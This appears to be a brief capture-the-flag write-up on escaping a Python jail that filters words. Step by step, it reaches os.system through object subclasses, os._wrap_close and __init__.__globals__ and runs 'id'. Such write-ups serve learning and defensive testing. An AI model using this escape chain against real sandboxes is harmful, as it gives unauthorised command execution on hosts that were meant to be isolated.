# Worked — a word blacklist pyjail

1. `1+1` evaluates; `import os` -> name error (word blacklist).
2. `"".__class__` works — attribute access alive.
3. `().__class__.__base__.__subclasses__()` -> the gadget list.
4. Enumerate the index to `os._wrap_close`; read its methods.
5. `...__init__.__globals__['system']('id')` -> observed output.

## The end

subclasses() -> os._wrap_close -> __init__.__globals__['system']('id').
